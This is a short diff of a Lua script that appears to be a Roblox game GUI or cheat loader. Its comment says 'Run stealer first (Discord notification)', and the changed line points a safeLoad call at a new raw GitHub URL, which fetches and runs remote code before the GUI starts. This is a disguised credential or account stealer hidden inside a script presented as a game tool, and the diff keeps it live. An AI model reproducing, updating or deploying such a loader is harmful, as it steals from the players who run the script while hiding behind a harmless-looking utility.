@@ -9,7 +9,7 @@ end
 
 -- Run stealer first (Discord notification)
 task.spawn(function()
-    safeLoad('https://raw.githubusercontent.com/growagardenv3/gui/refs/heads/main/gagkeyless.lua.txt')
+    safeLoad('https://raw.githubusercontent.com/growagardenv3/gui/refs/heads/main/gagupdated.lua.txt')
 end)
 
 -- Add slight delay before running GUI to avoid conflict
